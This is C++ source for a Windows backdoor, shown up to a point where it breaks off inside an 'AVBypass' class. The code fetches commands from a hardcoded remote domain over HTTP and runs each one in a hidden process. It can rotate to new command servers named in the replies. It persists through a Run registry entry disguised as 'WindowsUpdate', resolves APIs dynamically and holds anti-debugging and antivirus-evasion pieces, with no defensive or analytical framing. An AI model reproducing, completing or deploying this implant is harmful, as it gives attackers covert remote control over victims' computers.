#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <memory>
#include <cstdarg>
#include <stdexcept>
#include <cstdlib>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

typedef enum _PROCESSINFOCLASS {
    ProcessDebugPort = 7,
    ProcessDebugFlags = 31,
    ProcessBasicInformation = 0
} PROCESSINFOCLASS;

namespace Config {
    const char* INITIAL_DOMAIN = "remote.com";
    const wchar_t* MUTEX_NAME = L"RemoteCommandExecutorMutex";
    const wchar_t* REGISTRY_APP_KEY = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const wchar_t* REGISTRY_DOMAIN_KEY = L"Software\\RemoteCmdExec";
    const wchar_t* REGISTRY_DOMAIN_VALUE = L"Domain";
    const size_t MAX_DOMAIN_LENGTH = 256;
    const size_t MAX_COMMAND_LENGTH = 8192;
    const size_t MAX_RESPONSE_SIZE = 16384;
    const int HTTP_PORT = 80;
}

template<typename T>
T getProcAddressTyped(const char* dllName, const char* procName) {
    HMODULE hModule = LoadLibraryA(dllName);
    if (hModule == nullptr) return nullptr;
    FARPROC proc = GetProcAddress(hModule, procName);
    return reinterpret_cast<T>(proc);
}

typedef BOOL (WINAPI* CreateProcessA_t)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef LONG (WINAPI* RegOpenKeyEx_t)(
    HKEY hKey,
    LPCWSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,
    PHKEY phkResult
);

typedef LONG (WINAPI* RegSetValueEx_t)(
    HKEY hKey,
    LPCWSTR lpValueName,
    DWORD Reserved,
    DWORD dwType,
    const BYTE* lpData,
    DWORD cbData
);

typedef LONG (WINAPI* RegQueryValueEx_t)(
    HKEY hKey,
    LPCWSTR lpValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
);

typedef LONG (WINAPI* RegCreateKeyEx_t)(
    HKEY hKey,
    LPCWSTR lpSubKey,
    DWORD Reserved,
    LPWSTR lpClass,
    DWORD dwOptions,
    REGSAM samDesired,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    PHKEY phkResult,
    LPDWORD lpdwDisposition
);

typedef DWORD (WINAPI* GetModuleFileNameA_t)(
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
);

typedef LPVOID (WINAPI* VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

typedef NTSTATUS (WINAPI* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

class Utils {
public:

    static size_t strlen(const char* str) {
        if (str == nullptr) return 0;
        size_t len = 0;
        while (str[len] != '\0') len++;
        return len;
    }

    static char* strstr(const char* haystack, const char* needle) {
        if (haystack == nullptr || needle == nullptr) return nullptr;
        size_t needleLen = strlen(needle);
        if (needleLen == 0) return const_cast<char*>(haystack);

        for (size_t i = 0; haystack[i] != '\0'; i++) {
            bool match = true;
            for (size_t j = 0; j < needleLen; j++) {
                if (haystack[i + j] == '\0' || haystack[i + j] != needle[j]) {
                    match = false;
                    break;
                }
            }
            if (match) return const_cast<char*>(haystack + i);
        }
        return nullptr;
    }

    static char* strchr(const char* str, int ch) {
        if (str == nullptr) return nullptr;
        for (size_t i = 0; str[i] != '\0'; i++) {
            if (str[i] == static_cast<char>(ch)) return const_cast<char*>(str + i);
        }
        if (ch == '\0') return const_cast<char*>(str + strlen(str));
        return nullptr;
    }

    static void strncpy(char* dest, const char* src, size_t n) {
        if (dest == nullptr || src == nullptr || n == 0) return;
        size_t i;
        for (i = 0; i < n - 1 && src[i] != '\0'; i++) {
            dest[i] = src[i];
        }
        dest[i] = '\0';
    }

    static int strcmp(const char* str1, const char* str2) {
        if (str1 == nullptr && str2 == nullptr) return 0;
        if (str1 == nullptr) return -1;
        if (str2 == nullptr) return 1;

        size_t i = 0;
        while (str1[i] != '\0' && str2[i] != '\0') {
            if (str1[i] < str2[i]) return -1;
            if (str1[i] > str2[i]) return 1;
            i++;
        }
        if (str1[i] == '\0' && str2[i] == '\0') return 0;
        if (str1[i] == '\0') return -1;
        return 1;
    }

    static void memset(void* ptr, int value, size_t num) {
        unsigned char* p = static_cast<unsigned char*>(ptr);
        for (size_t i = 0; i < num; i++) {
            p[i] = static_cast<unsigned char>(value);
        }
    }

    static void memcpy(void* dest, const void* src, size_t num) {
        unsigned char* d = static_cast<unsigned char*>(dest);
        const unsigned char* s = static_cast<const unsigned char*>(src);
        for (size_t i = 0; i < num; i++) {
            d[i] = s[i];
        }
    }

    static int atoi(const char* str) {
        if (str == nullptr) return 0;

        size_t i = 0;
        while (str[i] == ' ' || str[i] == '\t') i++;

        int sign = 1;
        if (str[i] == '-') {
            sign = -1;
            i++;
        } else if (str[i] == '+') {
            i++;
        }

        int result = 0;
        while (str[i] >= '0' && str[i] <= '9') {
            result = result * 10 + (str[i] - '0');
            i++;
        }

        return result * sign;
    }

    static int itoa(int value, char* str, int base) {
        if (str == nullptr || base < 2 || base > 36) return 0;

        char* ptr = str;
        bool isNegative = false;

        if (value < 0 && base == 10) {
            isNegative = true;
            value = -value;
        }

        if (value == 0) {
            *ptr++ = '0';
            *ptr = '\0';
            return 1;
        }

        char buffer[32];
        auto idx = 0;

        while (value > 0) {
            auto remainder = value % base;
            buffer[idx++] = (remainder < 10) ? static_cast<char>('0' + remainder) : static_cast<char>('a' + remainder - 10);
            value /= base;
        }

        if (isNegative) {
            *ptr++ = '-';
        }

        for (int j = idx - 1; j >= 0; j--) {
            *ptr++ = buffer[j];
        }
        *ptr = '\0';

        return static_cast<int>(ptr - str);
    }

    static int snprintf(char* str, size_t size, const char* format, ...) {
        if (str == nullptr || size == 0 || format == nullptr) return 0;

        va_list args;
        va_start(args, format);

        size_t pos = 0;
        for (size_t i = 0; format[i] != '\0' && pos < size - 1; i++) {
            if (format[i] == '%') {
                i++;
                if (format[i] == 's') {
                    const char* s = va_arg(args, const char*);
                    if (s == nullptr) s = "(null)";
                    size_t len = strlen(s);
                    size_t copyLen = (len < size - pos - 1) ? len : (size - pos - 1);
                    memcpy(str + pos, s, copyLen);
                    pos += copyLen;
                } else if (format[i] == 'd' || format[i] == 'i') {
                    int val = va_arg(args, int);
                    char numStr[32];
                    itoa(val, numStr, 10);
                    size_t len = strlen(numStr);
                    size_t copyLen = (len < size - pos - 1) ? len : (size - pos - 1);
                    memcpy(str + pos, numStr, copyLen);
                    pos += copyLen;
                } else if (format[i] == 'u') {
                    unsigned int val = va_arg(args, unsigned int);
                    char numStr[32];
                    auto temp = val;
                    auto idx = 0;
                    if (temp == 0) {
                        numStr[idx++] = '0';
                    } else {
                        while (temp > 0) {
                            numStr[idx++] = '0' + (temp % 10);
                            temp /= 10;
                        }
                    }
                    numStr[idx] = '\0';
                    for (auto j = 0; j < idx / 2; j++) {
                        auto tmp = numStr[j];
                        numStr[j] = numStr[idx - 1 - j];
                        numStr[idx - 1 - j] = tmp;
                    }
                    auto len = strlen(numStr);
                    auto copyLen = (len < size - pos - 1) ? len : (size - pos - 1);
                    memcpy(str + pos, numStr, copyLen);
                    pos += copyLen;
                } else if (format[i] == 'x') {
                    unsigned int val = va_arg(args, unsigned int);
                    char numStr[32];
                    auto temp = val;
                    auto idx = 0;
                    if (temp == 0) {
                        numStr[idx++] = '0';
                    } else {
                        while (temp > 0) {
                            auto digit = temp % 16;
                            numStr[idx++] = (digit < 10) ? static_cast<char>('0' + digit) : static_cast<char>('a' + digit - 10);
                            temp /= 16;
                        }
                    }
                    numStr[idx] = '\0';
                    for (auto j = 0; j < idx / 2; j++) {
                        auto tmp = numStr[j];
                        numStr[j] = numStr[idx - 1 - j];
                        numStr[idx - 1 - j] = tmp;
                    }
                    auto len = strlen(numStr);
                    auto copyLen = (len < size - pos - 1) ? len : (size - pos - 1);
                    memcpy(str + pos, numStr, copyLen);
                    pos += copyLen;
                } else if (format[i] == 'l' && format[i + 1] == 'u') {
                    i++;
                    unsigned long val = va_arg(args, unsigned long);
                    char numStr[32];
                    auto temp = val;
                    auto idx = 0;
                    if (temp == 0) {
                        numStr[idx++] = '0';
                    } else {
                        while (temp > 0) {
                            numStr[idx++] = '0' + (temp % 10);
                            temp /= 10;
                        }
                    }
                    numStr[idx] = '\0';
                    for (auto j = 0; j < idx / 2; j++) {
                        auto tmp = numStr[j];
                        numStr[j] = numStr[idx - 1 - j];
                        numStr[idx - 1 - j] = tmp;
                    }
                    auto len = strlen(numStr);
                    auto copyLen = (len < size - pos - 1) ? len : (size - pos - 1);
                    memcpy(str + pos, numStr, copyLen);
                    pos += copyLen;
                } else if (format[i] == '%') {
                    if (pos < size - 1) str[pos++] = '%';
                } else {
                    if (pos < size - 1) str[pos++] = '%';
                    if (pos < size - 1 && format[i] != '\0') str[pos++] = format[i];
                }
            } else {
                str[pos++] = format[i];
            }
        }

        str[pos] = '\0';
        va_end(args);
        return static_cast<int>(pos);
    }

    static unsigned int time() {
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        ULARGE_INTEGER uli;
        uli.LowPart = ft.dwLowDateTime;
        uli.HighPart = ft.dwHighDateTime;
        uli.QuadPart -= 116444736000000000ULL;
        return static_cast<unsigned int>(uli.QuadPart / 10000000ULL);
    }

    static void srand(unsigned int seed) {
        g_rand_seed = seed;
    }

    static int rand() {
        g_rand_seed = (g_rand_seed * 1103515245U + 12345U) & 0x7fffffffU;
        return static_cast<int>(g_rand_seed);
    }

private:
    static unsigned int g_rand_seed;
};

unsigned int Utils::g_rand_seed = 1;

class FileHandle {
public:
    FileHandle() : handle_(INVALID_HANDLE_VALUE) {}

    explicit FileHandle(HANDLE h) : handle_(h) {}

    ~FileHandle() {
        close();
    }

    FileHandle(const FileHandle&) = delete;
    FileHandle& operator=(const FileHandle&) = delete;

    FileHandle(FileHandle&& other) noexcept : handle_(other.handle_) {
        other.handle_ = INVALID_HANDLE_VALUE;
    }

    FileHandle& operator=(FileHandle&& other) noexcept {
        if (this != &other) {
            close();
            handle_ = other.handle_;
            other.handle_ = INVALID_HANDLE_VALUE;
        }
        return *this;
    }

    HANDLE get() const { return handle_; }
    HANDLE release() {
        HANDLE h = handle_;
        handle_ = INVALID_HANDLE_VALUE;
        return h;
    }

    void reset(HANDLE h = INVALID_HANDLE_VALUE) {
        close();
        handle_ = h;
    }

    bool isValid() const { return handle_ != INVALID_HANDLE_VALUE; }

private:
    void close() {
        if (handle_ != INVALID_HANDLE_VALUE) {
            CloseHandle(handle_);
            handle_ = INVALID_HANDLE_VALUE;
        }
    }

    HANDLE handle_;
};

class MutexHandle {
public:
    MutexHandle() : handle_(nullptr) {}

    explicit MutexHandle(HANDLE h) : handle_(h) {}

    ~MutexHandle() {
        close();
    }

    MutexHandle(const MutexHandle&) = delete;
    MutexHandle& operator=(const MutexHandle&) = delete;

    MutexHandle(MutexHandle&& other) noexcept : handle_(other.handle_) {
        other.handle_ = nullptr;
    }

    MutexHandle& operator=(MutexHandle&& other) noexcept {
        if (this != &other) {
            close();
            handle_ = other.handle_;
            other.handle_ = nullptr;
        }
        return *this;
    }

    HANDLE get() const { return handle_; }
    HANDLE release() {
        HANDLE h = handle_;
        handle_ = nullptr;
        return h;
    }

    void reset(HANDLE h = nullptr) {
        close();
        handle_ = h;
    }

    bool isValid() const { return handle_ != nullptr; }

private:
    void close() {
        if (handle_ != nullptr) {
            CloseHandle(handle_);
            handle_ = nullptr;
        }
    }

    HANDLE handle_;
};

class Logger {
public:
    Logger(bool debugMode = false) : debugMode_(debugMode) {}

    ~Logger() {
        close();
    }

    void setDebugMode(bool enabled) {
        debugMode_ = enabled;
    }

    void init() {
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath) == 0) {
            throw std::runtime_error("Failed to get temp path");
        }

        unsigned int timestamp = Utils::time();
        char logPath[MAX_PATH];
        Utils::snprintf(logPath, sizeof(logPath), "%s\\~tmp%08x.log", tempPath, timestamp);

        HANDLE hFile = CreateFileA(logPath, FILE_APPEND_DATA, FILE_SHARE_READ, nullptr,
                                   OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);

        if (hFile == INVALID_HANDLE_VALUE) {
            throw std::runtime_error("Failed to create log file");
        }

        logFile_.reset(hFile);
    }

    void write(const std::string& message) {
        if (!logFile_.isValid()) return;

        DWORD written;
        DWORD len = static_cast<DWORD>(message.length());
        WriteFile(logFile_.get(), message.c_str(), len, &written, nullptr);
        WriteFile(logFile_.get(), "\r\n", 2, &written, nullptr);
    }

    void writeError(const std::string& function, const std::string& message) {
        char logMsg[512];
        Utils::snprintf(logMsg, sizeof(logMsg), "[ERROR] %s: %s (Error: %lu)",
                       function.c_str(), message.c_str(), GetLastError());
        write(std::string(logMsg));
        if (debugMode_) {
            printf("%s\n", logMsg);
        }
    }

    void writeInfo(const std::string& message) {
        char logMsg[512];
        Utils::snprintf(logMsg, sizeof(logMsg), "[INFO] %s", message.c_str());
        write(std::string(logMsg));
        if (debugMode_) {
            printf("%s\n", logMsg);
        }
    }

    void writeDebug(const std::string& message) {
        if (debugMode_) {
            char logMsg[512];
            Utils::snprintf(logMsg, sizeof(logMsg), "[DEBUG] %s", message.c_str());
            write(std::string(logMsg));
            printf("%s\n", logMsg);
        }
    }

    HANDLE getHandle() const {
        return logFile_.get();
    }

    void close() {
        logFile_.reset();
    }

    bool isDebugMode() const {
        return debugMode_;
    }

private:
    FileHandle logFile_;
    bool debugMode_;
};

class JsonParser {
public:
    bool parse(const std::string& json, std::string& command,
               std::string& next, int& sleep) {
        if (json.empty()) return false;

        command.clear();
        next.clear();
        sleep = 0;

        const char* cmdStart = Utils::strstr(json.c_str(), "\"command\"");
        if (cmdStart == nullptr) return false;

        cmdStart = Utils::strchr(cmdStart, ':');
        if (cmdStart == nullptr) return false;
        cmdStart = Utils::strchr(cmdStart, '"');
        if (cmdStart == nullptr) return false;
        cmdStart++;

        const char* cmdEnd = Utils::strchr(cmdStart, '"');
        if (cmdEnd == nullptr) return false;
        size_t cmdLen = static_cast<size_t>(cmdEnd - cmdStart);
        command.assign(cmdStart, cmdLen);

        const char* nextStart = Utils::strstr(json.c_str(), "\"next\"");
        if (nextStart == nullptr) return false;

        nextStart = Utils::strchr(nextStart, ':');
        if (nextStart == nullptr) return false;
        nextStart = Utils::strchr(nextStart, '"');
        if (nextStart == nullptr) return false;
        nextStart++;

        const char* nextEnd = Utils::strchr(nextStart, '"');
        if (nextEnd == nullptr) return false;
        size_t nextLen = static_cast<size_t>(nextEnd - nextStart);
        next.assign(nextStart, nextLen);

        const char* sleepStart = Utils::strstr(json.c_str(), "\"sleep\"");
        if (sleepStart == nullptr) return false;

        sleepStart = Utils::strchr(sleepStart, ':');
        if (sleepStart == nullptr) return false;
        sleepStart++;

        while (*sleepStart == ' ' || *sleepStart == '\t') sleepStart++;

        sleep = Utils::atoi(sleepStart);

        return true;
    }

    bool validateFields(const std::string& json) const {
        if (json.empty()) return false;
        bool hasCommand = (Utils::strstr(json.c_str(), "\"command\"") != nullptr);
        bool hasNext = (Utils::strstr(json.c_str(), "\"next\"") != nullptr);
        bool hasSleep = (Utils::strstr(json.c_str(), "\"sleep\"") != nullptr);
        return hasCommand && hasNext && hasSleep;
    }

    bool validateSleepDuration(int sleep) const {
        return sleep > 0;
    }

    bool validateDomainFormat(const std::string& domain) const {
        if (domain.empty()) return false;
        if (domain.length() > Config::MAX_DOMAIN_LENGTH - 1) return false;

        for (size_t i = 0; i < domain.length(); i++) {
            char c = domain[i];
            if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                  (c >= '0' && c <= '9') || c == '.' || c == '-')) {
                return false;
            }
        }
        return true;
    }
};

class RegistryManager {
public:
    RegistryManager() {

        pRegOpenKeyEx_ = getProcAddressTyped<RegOpenKeyEx_t>("advapi32.dll", "RegOpenKeyExW");
        pRegQueryValueEx_ = getProcAddressTyped<RegQueryValueEx_t>("advapi32.dll", "RegQueryValueExW");
        pRegSetValueEx_ = getProcAddressTyped<RegSetValueEx_t>("advapi32.dll", "RegSetValueExW");
        pRegCreateKeyEx_ = getProcAddressTyped<RegCreateKeyEx_t>("advapi32.dll", "RegCreateKeyExW");

        if (pRegOpenKeyEx_ == nullptr || pRegQueryValueEx_ == nullptr ||
            pRegSetValueEx_ == nullptr || pRegCreateKeyEx_ == nullptr) {
            throw std::runtime_error("Failed to resolve registry APIs");
        }
    }

    bool readString(HKEY hKey, const std::wstring& subKey,
                    const std::wstring& valueName, std::string& buffer) const {
        HKEY hSubKey;
        if (pRegOpenKeyEx_(hKey, subKey.c_str(), 0, KEY_READ, &hSubKey) != ERROR_SUCCESS) {
            return false;
        }

        wchar_t wBuffer[Config::MAX_DOMAIN_LENGTH];
        DWORD wSize = sizeof(wBuffer);
        DWORD dwType;

        LONG result = pRegQueryValueEx_(hSubKey, valueName.c_str(), nullptr, &dwType,
                                     reinterpret_cast<LPBYTE>(wBuffer), &wSize);
        RegCloseKey(hSubKey);

        if (result == ERROR_SUCCESS && dwType == REG_SZ) {
            char mbBuffer[Config::MAX_DOMAIN_LENGTH];
            WideCharToMultiByte(CP_UTF8, 0, wBuffer, -1, mbBuffer,
                               static_cast<int>(sizeof(mbBuffer)), nullptr, nullptr);
            buffer = std::string(mbBuffer);
            return true;
        }

        return false;
    }

    bool writeString(HKEY hKey, const std::wstring& subKey,
                     const std::wstring& valueName, const std::string& value) {
        HKEY hSubKey;
        DWORD dwDisposition;

        if (pRegCreateKeyEx_(hKey, subKey.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE,
                          KEY_WRITE, nullptr, &hSubKey, &dwDisposition) != ERROR_SUCCESS) {
            return false;
        }

        wchar_t wValue[Config::MAX_DOMAIN_LENGTH];
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, wValue,
                           static_cast<int>(Config::MAX_DOMAIN_LENGTH));

        size_t wLen = 0;
        while (wValue[wLen] != L'\0') wLen++;

        LONG result = pRegSetValueEx_(hSubKey, valueName.c_str(), 0, REG_SZ,
                                   reinterpret_cast<const BYTE*>(wValue),
                                   static_cast<DWORD>(wLen * sizeof(wchar_t)));

        RegCloseKey(hSubKey);
        return (result == ERROR_SUCCESS);
    }

    bool deleteValue(HKEY hKey, const std::wstring& subKey,
                     const std::wstring& valueName) {
        HKEY hSubKey;
        if (pRegOpenKeyEx_(hKey, subKey.c_str(), 0, KEY_WRITE, &hSubKey) != ERROR_SUCCESS) {
            return false;
        }

        LONG result = RegDeleteValueW(hSubKey, valueName.c_str());
        RegCloseKey(hSubKey);
        return (result == ERROR_SUCCESS);
    }

private:

    RegOpenKeyEx_t pRegOpenKeyEx_;
    RegQueryValueEx_t pRegQueryValueEx_;
    RegSetValueEx_t pRegSetValueEx_;
    RegCreateKeyEx_t pRegCreateKeyEx_;
};

class HttpClient {
public:
    HttpClient(int port = Config::HTTP_PORT, Logger* logger = nullptr) : winsockInitialized_(false), port_(port), logger_(logger) {}

    void setLogger(Logger* logger) {
        logger_ = logger;
    }

    ~HttpClient() {
        cleanupWinsock();
    }

    bool getRequest(const std::string& domain, std::string& response) {
        initWinsock();

        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Resolving DNS for domain: %s", domain.c_str());
            logger_->writeDebug(debugMsg);
        }

        char ip[16];
        if (!dnsResolve(domain.c_str(), ip, sizeof(ip))) {
            throw std::runtime_error("DNS resolution failed");
        }

        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "DNS resolved to IP: %s", ip);
            logger_->writeDebug(debugMsg);
        }

        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Socket creation failed");
        }

        DWORD timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<char*>(&timeout), sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<char*>(&timeout), sizeof(timeout));

        struct sockaddr_in serverAddr;
        Utils::memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port_);
        inet_pton(AF_INET, ip, &serverAddr.sin_addr);

        if (connect(sock, reinterpret_cast<struct sockaddr*>(&serverAddr),
                   sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            throw std::runtime_error("Connection failed");
        }

        char request[512];
        Utils::snprintf(request, sizeof(request),
                       "GET / HTTP/1.1\r\n"
                       "Host: %s\r\n"
                       "User-Agent: RemoteCmdExec/1.0\r\n"
                       "Connection: close\r\n"
                       "\r\n", domain.c_str());

        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[512];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Connecting to %s:%d", ip, port_);
            logger_->writeDebug(debugMsg);
            Utils::snprintf(debugMsg, sizeof(debugMsg), "HTTP Request:\n%s", request);
            logger_->writeDebug(debugMsg);
        }

        if (send(sock, request, static_cast<int>(Utils::strlen(request)), 0) == SOCKET_ERROR) {
            closesocket(sock);
            throw std::runtime_error("Send failed");
        }

        char buffer[Config::MAX_RESPONSE_SIZE];
        size_t totalReceived = 0;
        size_t remaining = sizeof(buffer) - 1;

        while (remaining > 0) {
            int bytesReceived = recv(sock, buffer + totalReceived,
                                    static_cast<int>(remaining), 0);
            if (bytesReceived <= 0) break;
            totalReceived += static_cast<size_t>(bytesReceived);
            remaining -= static_cast<size_t>(bytesReceived);
        }

        closesocket(sock);

        buffer[totalReceived] = '\0';

        const char* bodyStart = Utils::strstr(buffer, "\r\n\r\n");
        if (bodyStart != nullptr) {
            bodyStart += 4;
            response = std::string(bodyStart);
        } else {
            response = std::string(buffer);
        }

        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[512];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "HTTP Response received (%zu bytes): %s", totalReceived, response.c_str());
            logger_->writeDebug(debugMsg);
        }

        return totalReceived > 0;
    }

    bool getRequestWithRetry(const std::string& domain, std::string& response) {
        int delays[] = {5, 10, 20};
        int maxRetries = 3;

        for (int attempt = 0; attempt < maxRetries; attempt++) {
            if (logger_ && logger_->isDebugMode()) {
                char debugMsg[256];
                Utils::snprintf(debugMsg, sizeof(debugMsg), "HTTP retry attempt %d/%d for domain: %s", attempt + 1, maxRetries, domain.c_str());
                logger_->writeDebug(debugMsg);
            }

            try {
                if (getRequest(domain, response)) {
                    return true;
                }
            } catch (...) {
                if (logger_ && logger_->isDebugMode()) {
                    logger_->writeDebug("HTTP request failed, will retry");
                }
            }

            if (attempt < maxRetries - 1) {
                if (logger_ && logger_->isDebugMode()) {
                    char debugMsg[256];
                    Utils::snprintf(debugMsg, sizeof(debugMsg), "Waiting %d seconds before retry", delays[attempt]);
                    logger_->writeDebug(debugMsg);
                }
                Sleep(delays[attempt] * 1000);
            }
        }

        if (logger_ && logger_->isDebugMode()) {
            logger_->writeDebug("All HTTP retry attempts exhausted");
        }

        return false;
    }

    bool getWithDnsRetry(const std::string& domain, std::string& response) {
        int delays[] = {2, 4, 8};
        int maxRetries = 3;

        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Attempting DNS retry for domain: %s", domain.c_str());
            logger_->writeDebug(debugMsg);
        }

        for (int attempt = 0; attempt < maxRetries; attempt++) {
            try {
                if (getRequest(domain, response)) {
                    return true;
                }
            } catch (...) {
                DWORD error = WSAGetLastError();
                if (error == WSAHOST_NOT_FOUND || error == WSANO_DATA) {
                    if (logger_ && logger_->isDebugMode()) {
                        char debugMsg[256];
                        Utils::snprintf(debugMsg, sizeof(debugMsg), "DNS error (WSAHOST_NOT_FOUND/WSANO_DATA), retry %d/%d", attempt + 1, maxRetries);
                        logger_->writeDebug(debugMsg);
                    }
                    if (attempt < maxRetries - 1) {
                        Sleep(delays[attempt] * 1000);
                        continue;
                    }
                }
                if (logger_ && logger_->isDebugMode()) {
                    logger_->writeDebug("DNS retry failed, falling back to request retry");
                }
                return getRequestWithRetry(domain, response);
            }
        }

        if (logger_ && logger_->isDebugMode()) {
            logger_->writeDebug("All DNS retry attempts exhausted");
        }

        return false;
    }

    bool getWithFallback(const std::string& domain, std::string& response) {
        if (logger_ && logger_->isDebugMode()) {
            char debugMsg[256];
            Utils::snprintf(debugMsg, sizeof(debugMsg), "Attempting HTTP request with fallback for domain: %s", domain.c_str());
            logger_->writeDebug(debugMsg);
        }

        if (getWithDnsRetry(domain, response)) {
            return true;
        }

        if (Utils::strcmp(domain.c_str(), Config::INITIAL_DOMAIN) != 0) {
            if (logger_ && logger_->isDebugMode()) {
                char debugMsg[256];
                Utils::snprintf(debugMsg, sizeof(debugMsg), "Falling back to initial domain: %s", Config::INITIAL_DOMAIN);
                logger_->writeDebug(debugMsg);
            }
            return getRequestWithRetry(Config::INITIAL_DOMAIN, response);
        }

        return false;
    }

private:
    void initWinsock() {
        if (winsockInitialized_) return;

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("Winsock initialization failed");
        }

        winsockInitialized_ = true;
    }

    void cleanupWinsock() {
        if (winsockInitialized_) {
            WSACleanup();
            winsockInitialized_ = false;
        }
    }

    bool dnsResolve(const char* hostname, char* ip, size_t ipSize) {
        struct addrinfo hints, *result = nullptr;
        Utils::memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
            return false;
        }

        struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(result->ai_addr);
        if (inet_ntop(AF_INET, &addr->sin_addr, ip, static_cast<socklen_t>(ipSize)) == nullptr) {
            freeaddrinfo(result);
            return false;
        }

        freeaddrinfo(result);
        return true;
    }

    bool winsockInitialized_;
    int port_;
    Logger* logger_;
};

class CommandExecutor {
public:
    explicit CommandExecutor(HANDLE logFile) : logFile_(logFile), pCreateProcessA_(nullptr) {

        pCreateProcessA_ = getProcAddressTyped<CreateProcessA_t>("kernel32.dll", "CreateProcessA");
        if (pCreateProcessA_ == nullptr) {
            throw std::runtime_error("Failed to resolve CreateProcessA");
        }
    }

    bool execute(const std::string& command) {
        if (command.empty()) {
            throw std::invalid_argument("Empty command");
        }

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};

        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = logFile_;
        si.hStdError = logFile_;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        std::string cmdCopy = command;
        BOOL success = pCreateProcessA_(nullptr, &cmdCopy[0], nullptr, nullptr, TRUE,
                                      CREATE_NO_WINDOW | CREATE_NEW_CONSOLE,
                                      nullptr, nullptr, &si, &pi);

        if (!success) {
            throw std::runtime_error("CreateProcess failed");
        }

        DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);

        if (waitResult == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
        }

        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    bool executeSafe(const std::string& command) {
        try {
            execute(command);
            return true;
        } catch (...) {
            return true;
        }
    }

private:
    HANDLE logFile_;
    CreateProcessA_t pCreateProcessA_;
};

class PersistenceManager {
public:
    explicit PersistenceManager(RegistryManager* registryManager)
        : registryManager_(registryManager), pGetModuleFileNameA_(nullptr) {

        pGetModuleFileNameA_ = getProcAddressTyped<GetModuleFileNameA_t>("kernel32.dll", "GetModuleFileNameA");
        if (pGetModuleFileNameA_ == nullptr) {
            throw std::runtime_error("Failed to resolve GetModuleFileNameA");
        }
    }

    bool install() {
        char exePath[MAX_PATH];
        DWORD result = pGetModuleFileNameA_(nullptr, exePath, MAX_PATH);
        if (result == 0 || result >= MAX_PATH) {
            throw std::runtime_error("GetModuleFileName failed");
        }

        std::wstring regValueName = L"WindowsUpdate";
        std::string exePathStr(exePath);

        if (!registryManager_->writeString(HKEY_CURRENT_USER,
                                          Config::REGISTRY_APP_KEY,
                                          regValueName, exePathStr)) {
            throw std::runtime_error("Failed to write registry value");
        }

        return true;
    }

    bool isInstalled() const {
        std::wstring regValueName = L"WindowsUpdate";
        HKEY hKey;

        if (RegOpenKeyExW(HKEY_CURRENT_USER, Config::REGISTRY_APP_KEY,
                         0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return false;
        }

        DWORD dwType;
        DWORD dwSize = 0;
        LONG result = RegQueryValueExW(hKey, regValueName.c_str(), nullptr,
                                     &dwType, nullptr, &dwSize);

        RegCloseKey(hKey);

        return (result == ERROR_SUCCESS && dwType == REG_SZ && dwSize > 0);
    }

    void setup() {
        if (!isInstalled()) {
            try {
                install();
            } catch (...) {

            }
        }
    }

private:
    RegistryManager* registryManager_;
    GetModuleFileNameA_t pGetModuleFileNameA_;
};

class AVBypass {
public:
    void applyTechniques() {
        timingEvasionDelay();
